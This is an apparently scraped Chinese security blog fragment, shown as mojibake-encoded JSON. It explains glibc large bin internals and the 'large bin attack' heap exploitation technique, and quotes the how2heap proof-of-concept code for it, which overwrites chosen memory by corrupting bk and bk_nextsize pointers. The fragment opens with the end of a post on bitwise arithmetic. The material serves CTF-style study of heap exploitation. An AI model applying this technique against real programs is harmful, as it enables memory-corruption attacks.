èµ·æ¥å°±æ˜¯ç»“æœäº†ï¼ˆä¹˜æ³•å¾ˆå¯èƒ½æº¢å‡ºâ€¦â€¦åœ¨æ±‡ç¼–ä¸­mulæŒ‡ä»¤ä¼šæŠŠç»“æœæ”¾åœ¨ä¸¤ä¸ªå¯„å­˜å™¨ä¸­ï¼Œæˆ‘æ¯”è¾ƒæ‡’ï¼Œè¿™ä¹ˆææ¯”è¾ƒå¤æ‚ï¼Œå°±æ²¡æœ‰æï¼‰\né™¤æ³•çš„æ€è·¯å°±æ˜¯å·¦ç§»é™¤æ•°è®©å…¶åˆšå¥½å†ç§»ä¸€ä½å°±å¤§äºè¢«é™¤æ•°ï¼Œç„¶åè¢«é™¤æ•°å‡å»å®ƒï¼Œå¹¶åœ¨ç»“æœæ¨è¿›ä¸€ä¸ª1ï¼Œè¿™æ—¶å€™è¢«é™¤æ•°çš„æ€»ä½æ•°ä¸€å®šä¼šå°‘ä¸€ä½ï¼ˆå› ä¸ºé™¤æ•°*2 \u0026gt; è¢«é™¤æ•°ï¼Œé‚£ä¹ˆè¢«é™¤æ•° - é™¤æ•°ä¸€å®šä¼šå°äºè¢«é™¤æ•° \u0026raquo; 1ï¼‰ï¼Œç„¶åè®©é™¤æ•°å³ç§»ä¸€ä½ï¼Œå¦‚æœæ­¤æ—¶è¢«é™¤æ•°å°äºé™¤æ•°ï¼Œå°±åœ¨ç»“æœæ¨è¿›ä¸€ä¸ª0ï¼Œç„¶åå†å³ç§»é™¤æ•°â€¦â€¦æœ¬è´¨ä¸Šæ˜¯æ¨¡æ‹Ÿç«–å¼é™¤æ³•è¿ç®—ã€‚è¿™ä¸ªæ€è·¯å¯ä»¥ä¸€æ¬¡æ€§å¾—å‡ºç»“æœå’Œä½™æ•°ã€‚\nç¬”è€…çš„æ€è·¯å¯èƒ½ä¸æ˜¯æœ€é«˜æ•ˆçš„ï¼Œä¹Ÿå¯èƒ½æœ‰ä¸€å®šé—®é¢˜ï¼Œå¦‚æœæ‚¨è¯»å®Œæœ¬æ–‡åŠä»£ç ï¼Œæœ‰ä¸€äº›ç–‘é—®æˆ–å»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºæŒ‡å‡ºï¼è°¢è°¢ï¼\n","date":"2023å¹´02æœˆ21æ—¥","permalink":"https://peterliuzhi.top/posts/%E6%95%B4%E6%B4%BBc++%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%A8%A1%E8%BF%90%E7%AE%97%E7%AC%A6%E5%AE%9E%E7%8E%B0%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%A8%A1/","section":"posts","summary":"Always tell the truth. That way, you don\u0026rsquo;t have to remember what you said. â€” Mark Twain æœ€è¿‘åœ¨ä¸Šæ•°å­—é€»è¾‘ï¼Œæƒ³èµ·ä»¥å‰åšè¿‡çš„ä¸€é“ç®—æ³•é¢˜ï¼ˆä¸ç”¨åŠ æ³•ç¬¦å®ç°ä¸¤æ•°ç›¸åŠ ï¼‰ï¼Œçªå‘å¥‡æƒ³æƒ³è¦çº¯ç”¨ä½è¿ç®—å®ç°ä¸€ä¸‹åŠ å‡ä¹˜é™¤æ¨¡ ä»¥å‰æœ€","tags":["æ‚è°ˆ","C++","ç®—æ•°"],"title":"ã€æ•´æ´»ã€‘C++ä¸ç”¨åŠ å‡ä¹˜é™¤æ¨¡è¿ç®—ç¬¦å®ç°åŠ å‡ä¹˜é™¤æ¨¡"},{"categories":["principle"],"contents":" When you begin to touch your heart or let your heart be touched, you begin to discover that it\u0026rsquo;s bottomless. â€” Pema ChÃ¶drÃ¶n\nLarge binçš„æ•°æ®ç»“æ„ ä½•æ—¶ä¼šè¿›å…¥large binä¸­ï¼Ÿ Large binç”¨æ¥å‚¨å­˜é‡Šæ”¾æ‰çš„å¤§chunkã€‚\nå½“é‡Šæ”¾ä¸€ä¸ªå¤§chunkçš„æ—¶å€™ï¼Œä¼šå…ˆè¿›å…¥unsorted binã€‚ å½“ç¨‹åºå¼€å§‹ä»unsorted binä¸­æŸ¥æ‰¾chunkçš„æ—¶å€™ å¦‚æœæŸ¥æ‰¾åˆ°çš„chunkçš„å¤§å°ä¸ç­‰äºè¦ç”³è¯·çš„chunkçš„å¤§å°ï¼ˆchunk size != nbï¼‰ï¼Œå°±åˆ¤å®šä¸ºä¸ç¬¦åˆæ¡ä»¶çš„chunkï¼Œæ ¹æ®å®ƒçš„å¤§å°å°†å…¶æ”¾è¿›small binæˆ–è€…large binä¸­ã€‚ å¦‚æœæŸ¥æ‰¾åˆ°çš„chunkçš„å¤§å°ç­‰äºè¦ç”³è¯·çš„chunkçš„å¤§å°ï¼ˆchunk size == nbï¼‰ï¼Œå°±åˆ¤å®šä¸ºç¬¦åˆæ¡ä»¶çš„chunkï¼Œç›´æ¥åœæ­¢æŸ¥æ‰¾ï¼Œå°†å…¶ä»unsorted binä¸­å–å‡ºè¿”å› å¦‚æœåˆ°unsorted binä¸ºç©ºéƒ½æ²¡æœ‰æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„chunkï¼Œé‚£ä¹ˆå°±ä»small binæˆ–è€…large binä¸­å¯»æ‰¾å¯ä»¥åˆ†å‰²çš„æˆ–è€…å¤§å°åˆšå¥½çš„chunk ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¦åˆ†å‰²chunkï¼Œä¼šå°†ä»–ä»¬å…ˆæ”¾è¿›small binæˆ–è€…large binä¸­å†åˆ†å‰²ï¼Œå†æŠŠå‰©ä½™éƒ¨åˆ†æ”¾è¿›unsorted binä¸­ï¼š\næµ‹è¯•ç¨‹åº1 è°ƒè¯•ä»¥ä¸‹ç¨‹åºå¯ä»¥å‘ç°ï¼Œglibcåœ¨æŸ¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ†å‰²çš„chunkçš„æ—¶å€™ä¸ä¼šé€€å‡ºæŸ¥æ‰¾ï¼š\n#include\u0026lt;stdlib.h\u0026gt; int main() { void* p1 = malloc(2048); malloc(16); void* p2 = malloc(3072); malloc(16); void* p3 = malloc(2048); malloc(16); void* p4 = malloc(2048); malloc(16); free(p1); free(p2); free(p3); free(p4); p1 = malloc(3000); return 0; } å½“freeå®Œè¿™äº›å¤§chunkçš„æ—¶å€™ï¼Œä»–ä»¬éƒ½åœ¨unsorted binä¸­\nä½†æ˜¯å½“malloc(3000)çš„æ—¶å€™ï¼Œä»–ä»¬éƒ½è¿›å…¥äº†unsorted binä¸­ï¼Œç„¶åå…¶ä¸­ä¸€ä¸ªè¢«å–å‡ºåˆ†å‰²åæ”¾å›äº†unsorted binä¸­\nè°ƒè¯•ç¨‹åº2 è°ƒè¯•ä»¥ä¸‹ç¨‹åºå¯ä»¥å‘ç°ï¼Œç¨‹åºåœ¨é‡åˆ°å¤§å°åˆšåˆšå¥½çš„chunkçš„æ—¶å€™ä¼šç›´æ¥é€€å‡ºæŸ¥æ‰¾ï¼ŒåŒæ—¶ä¹Ÿå°è¯äº†å¯ä»¥åˆ†å‰²çš„chunkä¼šå…ˆè¿›å…¥large binæˆ–small binï¼š\n#include\u0026lt;stdlib.h\u0026gt; int main() { void* p1 = malloc(2048); malloc(16); void* p2 = malloc(2048); malloc(16); void* p3 = malloc(3072); malloc(16); void* p4 = malloc(2048); malloc(16); void* p5 = malloc(3072); malloc(16); void* p6 = malloc(3000); malloc(16); void* p7 = malloc(2048); malloc(16); free(p1); free(p2); free(p3); free(p4); free(p5); free(p6); free(p7); p1 = malloc(3000); return 0; } åœ¨malloc(3000)å‰ï¼š\nä¹‹åï¼š\nlarge binçš„ç»“æ„ï¼Ÿ ä¸€å…±æœ‰136ä¸ªbinï¼Œfast binæ˜¯ä¸€ä¸ªå•ç‹¬çš„æ•°ç»„ï¼Œå…¶ä¸­æœ‰10ä¸ªbinï¼Œå‰©ä¸‹çš„126ä¸ªbinæ˜¯å¦ä¸€ä¸ªæ•°ç»„ï¼Œè¿™126ä¸ªbinä¸­åºå·1æ˜¯unsorted binï¼Œåºå·2åˆ°åºå·63æ˜¯small binï¼Œ64åˆ°126æ˜¯large binï¼Œå½“chunkå¤§äº512Byteï¼ˆ64ä½ä¸‹æ˜¯1024Byteï¼‰\né‚£ä¹ˆlarge binçš„è¿™63ä¸ªbinæ˜¯å¦‚ä½•ç»„ç»‡çš„å‘¢ï¼Ÿ\nç»„ æ•°é‡ å…¬å·® 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 ä¸é™åˆ¶ è¿™äº›binåˆ†ä¸º6ç»„ï¼Œæ¯ä¸€ç»„ä¸­çš„binçš„å¤§å°ä¹‹é—´æœ‰ä¸€ä¸ªå›ºå®šçš„å…¬å·®ã€‚ä»¥ 32 ä½å¹³å°çš„ large bin ä¸ºä¾‹ï¼Œç¬¬ä¸€ä¸ª large bin çš„èµ·å§‹ chunk å¤§å°ä¸º 512 å­—èŠ‚ï¼Œä½äºç¬¬ä¸€ç»„ï¼Œæ‰€ä»¥è¯¥ bin å¯ä»¥å­˜å‚¨çš„ chunk çš„å¤§å°èŒƒå›´ä¸º [512,512+64)ã€‚\nä¸€å…±æœ‰136ä¸ªbinï¼Œä¸ºäº†çŸ¥é“è¿™ä¸ªæ”¾è¿›large binä¸­çš„chunkæ”¾è¿›è¿™136ä¸ªbinä¸­çš„å“ªä¸ªbinï¼Œæºç ä½¿ç”¨å®æ¥è®¡ç®—ï¼š\n#define largebin_index_32(sz) \\ (((((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \u0026lt;= 38) \\ ? 56 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \u0026lt;= 20) \\ ? 91 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \u0026lt;= 10) \\ ? 110 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \u0026lt;= 4) \\ ? 119 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \u0026lt;= 2) \\ ? 124 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \u0026lt;= 45) \\ ? 49 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \u0026lt;= 20) \\ ? 91 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \u0026lt;= 10) \\ ? 110 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \u0026lt;= 4) \\ ? 119 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \u0026lt;= 2) \\ ? 124 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \u0026lt;= 48) \\ ? 48 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \u0026lt;= 20) \\ ? 91 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \u0026lt;= 10) \\ ? 110 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \u0026lt;= 4) \\ ? 119 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \u0026lt;= 2) \\ ? 124 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz)) å¦‚æœæˆ‘ä»¬å…ˆmallocå…­ä¸ªå †å—ï¼Œå®é™…å¤§å°ä¸º0x400ï¼Œ0x410ï¼Œ0x420ï¼Œ0x420ï¼Œ0x430ï¼Œ0x430ï¼Œç„¶åæˆ‘ä»¬ä¾æ¬¡freeå¯ä»¥å¾—åˆ°ä¸‹é¢è¿™å¹…å›¾ï¼š\nï¼ˆå›¾æºè‡ªæµ…ælargebin attack - å…ˆçŸ¥ç¤¾åŒºï¼‰\nå…¶ä¸­æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨large binä¸­æˆ‘ä»¬ä½¿ç”¨äº†æ–°çš„ä¸¤ä¸ªåŸŸfd_nextsizeå’Œbk_nextsizeï¼Œä»–ä»¬åœ¨malloc_chunkç»“æ„ä½“çš„ä½ç½®å¦‚ä¸‹ï¼š\nfd_nextsizeç”¨äºæŒ‡å‘åŒç»„çš„binsä¸­ä¸‹ä¸€ä¸ªæ›´å°çš„binï¼Œbk_nextsizeç”¨äºæŒ‡å‘åŒç»„çš„binsä¸­ä¸‹ä¸€ä¸ªæ›´å¤§çš„binã€‚åŒæ—¶å®ƒæ˜¯åŒå‘é“¾è¡¨ï¼Œæ‰€ä»¥ä¸¤å¤´çš„chunkä¼šäº’ç›¸æŒ‡å‘ã€‚\nä¸‹é¢å†…å®¹æ¥è‡ªå †ç›¸å…³æ•°æ®ç»“æ„ - CTF Wiki\nfdï¼Œbk chunk å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» fd å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚chunk ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹ fd æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk bk æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk é€šè¿‡ fd å’Œ bk å¯ä»¥å°†ç©ºé—²çš„ chunk å—åŠ å…¥åˆ°ç©ºé—²çš„ chunk å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç† fd_nextsizeï¼Œ bk_nextsizeï¼Œä¹Ÿæ˜¯åªæœ‰ chunk ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ chunkï¼ˆlarge chunkï¼‰ã€‚ fd_nextsize æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚ bk_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚ ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼ŒfdæŒ‡å‘å˜å°çš„æ–¹å‘ï¼‰ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚\nLarge bin AttackåŸºæœ¬åŸç†æ¦‚è¿° åŸºæœ¬åŸç†æ˜¯ï¼Œå½“chunkæ’å…¥large binä¸­çš„æ—¶å€™ï¼Œä¼šæ”¹å˜åŸæœ‰chunkçš„fdã€bkç­‰ï¼Œè€Œå¦‚æœæˆ‘ä»¬åœ¨è¿™å‡ ä¸ªåŸŸä¸­å¡«å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„æ•°æ®ï¼Œå°±å¯ä»¥æ”¹å˜æŸå¤„çš„æ•°æ®ä¸ºæ­¤æ—¶æ’å…¥chunkçš„æŒ‡é’ˆå€¼ã€‚\næœ‰ä¸€ç‚¹ç±»ä¼¼äºunlinkçš„åŸç†ï¼Œä½†æ˜¯åˆ©ç”¨æ–¹æ³•æˆªç„¶ä¸åŒã€‚large bin attackå¯ä»¥æ›´æ”¹ä¸¤ä¸ªä½ç½®ä¸Šçš„å€¼ä¸ºp3çš„æŒ‡é’ˆï¼Œè¿™ä¸ªå€¼å¾€å¾€æŒºå¤§çš„ï¼Œå¯ä»¥æ›´æ”¹ä¸€äº›ä¸œè¥¿çš„é˜ˆé™å€¼ï¼Œæ¯”å¦‚å¢å¤§tcacheçš„æœ€å¤§å¤§å°ä»¥ä½¿ç”¨tcache poisonç­‰ã€‚\nå’Œunsorted bin attackä¸€æ ·å¯ä»¥æ‰“è¾…åŠ©ï¼Œä½†æ˜¯å®ƒæ›´å¼ºçš„ä¸€ç‚¹æ˜¯æˆ‘ä»¬å¯ä»¥çŸ¥é“å¡«å…¥çš„æ•°æ®æ˜¯ä¸€ä¸ªä»€ä¹ˆæ ·çš„å€¼ã€‚\nä¾‹å­è§£é‡Šï¼ˆ2.30ä»¥å‰ï¼‰ ä½¿ç”¨how2heap/large_bin_attack.c at master Â· shellphish/how2heap Â· GitHubä½œä¸ºä¾‹å­ï¼š\n/* This technique is taken from https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/ [...] else { victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } bck = fwd-\u0026gt;bk; [...] mark_bin (av, victim_index); victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; For more details on how large-bins are handled and sorted by ptmalloc, please check the Background section in the aforementioned link. [...] */ #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;assert.h\u0026gt; int main() { fprintf(stderr, \u0026#34;This file demonstrates large bin attack by writing a large unsigned long value into stack\\n\u0026#34;); fprintf(stderr, \u0026#34;In practice, large bin attack is generally prepared for further attacks, such as rewriting the \u0026#34; \u0026#34;global variable global_max_fast in libc for further fastbin attack\\n\\n\u0026#34;); unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr, \u0026#34;Let\u0026#39;s first look at the targets we want to rewrite on stack:\\n\u0026#34;); fprintf(stderr, \u0026#34;stack_var1 (%p): %ld\\n\u0026#34;, \u0026amp;stack_var1, stack_var1); fprintf(stderr, \u0026#34;stack_var2 (%p): %ld\\n\\n\u0026#34;, \u0026amp;stack_var2, stack_var2); unsigned long *p1 = malloc(0x420); fprintf(stderr, \u0026#34;Now, we allocate the first large chunk on the heap at: %p\\n\u0026#34;, p1 - 2); fprintf(stderr, \u0026#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\u0026#34; \u0026#34; the first large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); unsigned long *p2 = malloc(0x500); fprintf(stderr, \u0026#34;Then, we allocate the second large chunk on the heap at: %p\\n\u0026#34;, p2 - 2); fprintf(stderr, \u0026#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\u0026#34; \u0026#34; the second large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); unsigned long *p3 = malloc(0x500); fprintf(stderr, \u0026#34;Finally, we allocate the third large chunk on the heap at: %p\\n\u0026#34;, p3 - 2); fprintf(stderr, \u0026#34;And allocate another fastbin chunk in order to avoid consolidating the top chunk with\u0026#34; \u0026#34; the third large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); free(p1); free(p2); fprintf(stderr, \u0026#34;We free the first and second large chunks now and they will be inserted in the unsorted bin:\u0026#34; \u0026#34; [ %p \u0026lt;--\u0026gt; %p ]\\n\\n\u0026#34;, (void *)(p2 - 2), (void *)(p2[0])); malloc(0x90); fprintf(stderr, \u0026#34;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the\u0026#34; \u0026#34; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation\u0026#34; \u0026#34;, and reinsert the remaining of the freed first large chunk into the unsorted bin:\u0026#34; \u0026#34; [ %p ]\\n\\n\u0026#34;, (void *)((char *)p1 + 0x90)); free(p3); fprintf(stderr, \u0026#34;Now, we free the third large chunk and it will be inserted in the unsorted bin:\u0026#34; \u0026#34; [ %p \u0026lt;--\u0026gt; %p ]\\n\\n\u0026#34;, (void *)(p3 - 2), (void *)(p3[0])); //------------VULNERABILITY----------- fprintf(stderr, \u0026#34;Now emulating a vulnerability that can overwrite the freed second large chunk\u0026#39;s \\\u0026#34;size\\\u0026#34;\u0026#34; \u0026#34; as well as its \\\u0026#34;bk\\\u0026#34; and \\\u0026#34;bk_nextsize\\\u0026#34; pointers\\n\u0026#34;); fprintf(stderr, \u0026#34;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk\u0026#34; \u0026#34; at the head of the large bin freelist. To overwrite the stack variables, we set \\\u0026#34;bk\\\u0026#34; to 16 bytes before stack_var1 and\u0026#34; \u0026#34; \\\u0026#34;bk_nextsize\\\u0026#34; to 32 bytes before stack_var2\\n\\n\u0026#34;); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(\u0026amp;stack_var1 - 2); p2[3] = (unsigned long)(\u0026amp;stack_var2 - 4); //------------------------------------ malloc(0x90); fprintf(stderr, \u0026#34;Let\u0026#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.\u0026#34; \u0026#34; During this time, targets should have already been rewritten:\\n\u0026#34;); fprintf(stderr, \u0026#34;stack_var1 (%p): %p\\n\u0026#34;, \u0026amp;stack_var1, (void *)stack_var1); fprintf(stderr, \u0026#34;stack_var2 (%p): %p\\n\u0026#34;, \u0026amp;stack_var2, (void *)stack_var2); // sanity check assert(stack_var1 != 0); assert(stack_var2 != 0); return 0; } åœ¨Ubuntu18ä¸‹ä¿å­˜ä¸ºtest.cï¼Œä½¿ç”¨å‘½ä»¤gcc -g test.c -otestç¼–è¯‘\nä¸€å¼€å§‹æˆ‘ä»¬åˆå§‹åŒ–ä¸¤ä¸ªæ ˆä¸Šå˜é‡ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç­‰ä¼šéœ€è¦ä¿®æ”¹çš„å˜é‡ï¼š\nunsigned long stack_var1 = 0; unsigned long stack_var2 = 0; ç„¶åæˆ‘ä»¬åˆ†é…ä¸‰ä¸ªå¤§chunkå¹¶ç”¨å°chunkéš”å¼€ï¼Œç¬¬ä¸€ä¸ªå¤§chunkç”¨æ¥å¤„ç†åç»­çš„åˆ†å‰²è¯·æ±‚ï¼š\nunsigned long *p1 = malloc(0x420); malloc(0x20); unsigned long *p2 = malloc(0x500); malloc(0x20); unsigned long *p3 = malloc(0x500); malloc(0x20); ç„¶åæˆ‘ä»¬é‡Šæ”¾æ‰p1ã€p2ï¼Œä»–ä»¬ä¼šå…ˆè¿›å…¥unsorted binä¸­ã€‚ç„¶åæˆ‘ä»¬ç”³è¯·0x90çš„å†…å­˜ï¼Œè¿™æ—¶å€™ä¼šæŠŠp2æ”¾è¿›large binä¸­ï¼Œå°†p1å–å‡ºåˆ†å‰²åæ”¾å›unsorted binä¸­ã€‚\nfree(p1); free(p2); malloc(0x90); è¿™ä¸€æ­¥æ˜¯ä¸ºäº†è®©p2æå‰äºp3è¿›å…¥large binä¸­ï¼Œä½¿ç”¨p1æ˜¯ä¸ºäº†é˜²æ­¢åˆ†å‰²p2å¯¼è‡´å…¶å›åˆ°unsorted binä¸­ã€‚\nä¸‹ä¸€æ­¥æˆ‘ä»¬å°±é‡Šæ”¾æ‰p3ï¼š\nfree(p3); ç„¶åæˆ‘ä»¬å‡è®¾æœ‰è¿™ä¹ˆä¸€ä¸ªæ¼æ´ï¼Œå¯ä»¥æ›´æ”¹p2çš„sizeåŸŸã€bkåŸŸã€bk_nextsizeåŸŸï¼š\np2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(\u0026amp;stack_var1 - 2); p2[3] = (unsigned long)(\u0026amp;stack_var2 - 4); æˆ‘ä»¬æ”¹å°p2çš„sizeï¼Œè¿™æ ·æ’å…¥p3çš„æ—¶å€™ï¼Œç”±äºbkã€bk_nextsizeéƒ½æŒ‡å‘å˜å¤§çš„æ–¹å‘ï¼Œå› æ­¤p3ä¼šç»§æ‰¿p2çš„bkã€bk_nextsizeå¹¶ä¸”å°†p2çš„fdå’ŒåŸå…ˆp2æŒ‡å‘çš„ä¸‹ä¸€ä¸ªchunkï¼ˆä¹Ÿå°±æ˜¯p2-\u0026gt;bkï¼‰çš„bkæŒ‡å‘p3\nè€Œè¿™æ—¶ï¼Œå¦‚æœå°†p3æ’å…¥large binï¼Œé‚£ä¹ˆç”±äºbkæŒ‡å‘æ›´å¤§çš„ä¸€ä¸ªç©ºé—²çš„chunkï¼Œå› æ­¤p2-\u0026gt;bkä¼šè¢«æ›´æ”¹ä¸ºp3ï¼ŒåŒæ—¶ï¼Œp2-\u0026gt;bkåŸå…ˆçš„å€¼çš„fdä¼šæŒ‡å‘p3ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´ï¼š\nbck = p2-\u0026gt;bk; p2-\u0026gt;bk = p3; bck-\u0026gt;fd = p3; è€Œç”±äºæˆ‘ä»¬å°†p2-\u0026gt;bkæ”¹ä¸ºäº†\u0026amp;stack_var1-2ï¼Œå› æ­¤p2-\u0026gt;bk-\u0026gt;fdå°±æ˜¯stack_var1\nç›¸å…³æºç ä¸ºï¼š\nmark_bin (av, victim_index); victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; åŒç†ï¼Œbk_nextsizeä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•åˆ©ç”¨ï¼š\nelse { P3-\u0026gt;fd_nextsize = P2; //P3çš„fd_nextsizeè¦ä¿®æ”¹æˆP2çš„å¤´æŒ‡é’ˆ P3-\u0026gt;bk_nextsize = P2-\u0026gt;bk_nextsize; //P3çš„bk_nextsizeè¦ä¿®æ”¹æˆP2çš„bk_nextsizeæŒ‡å‘çš„åœ°å€ P2-\u0026gt;bk_nextsize = P3; //P2çš„bk_nextsizeè¦ä¿®æ”¹æˆP3çš„å¤´æŒ‡é’ˆ P3-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = P3; //P3çš„bk_nextsizeæ‰€æŒ‡å‘çš„å †å—çš„fd_nextsizeè¦ä¿®æ”¹æˆP3çš„å¤´æŒ‡é’ˆ } bck = P2-\u0026gt;bk; //bckç­‰äºP2çš„bk è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¤§å°çš„åˆ¤æ–­ï¼Œå…·ä½“çš„è§£æè§å¥½å¥½è¯´è¯ä¹‹Large Bin Attack_hollkçš„åšå®¢-CSDNåšå®¢\nä¾‹å­è§£é‡Šï¼ˆ2.30ä»¥åï¼‰ åœ¨2.30ä»¥åï¼Œglibcä¸ºlarge bin attackæ–°å¢äº†ä¸¤ä¸ªæ£€æŸ¥ï¼Œè¿™é‡Œä»¥how2heap/large_bin_attack.c at master Â· shellphish/how2heap Â· GitHubä¸ºä¾‹ï¼š\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;assert.h\u0026gt; /* A revisit to large bin attack for after glibc2.30 Relevant code snippet : if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)){ fwd = bck; bck = bck-\u0026gt;bk; victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } */ int main(){ /*Disable IO buffering to prevent stream from interfering with heap*/ setvbuf(stdin,NULL,_IONBF,0); setvbuf(stdout,NULL,_IONBF,0); setvbuf(stderr,NULL,_IONBF,0); printf(\u0026#34;\\n\\n\u0026#34;); printf(\u0026#34;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\\n\\n\u0026#34;); printf(\u0026#34;Check 1 : \\n\u0026#34;); printf(\u0026#34;\u0026gt; if (__glibc_unlikely (fwd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != fwd))\\n\u0026#34;); printf(\u0026#34;\u0026gt; malloc_printerr (\\\u0026#34;malloc(): largebin double linked list corrupted (nextsize)\\\u0026#34;);\\n\u0026#34;); printf(\u0026#34;Check 2 : \\n\u0026#34;); printf(\u0026#34;\u0026gt; if (bck-\u0026gt;fd != fwd)\\n\u0026#34;); printf(\u0026#34;\u0026gt; malloc_printerr (\\\u0026#34;malloc(): largebin double linked list corrupted (bk)\\\u0026#34;);\\n\\n\u0026#34;); printf(\u0026#34;This prevents the traditional large bin attack\\n\u0026#34;); 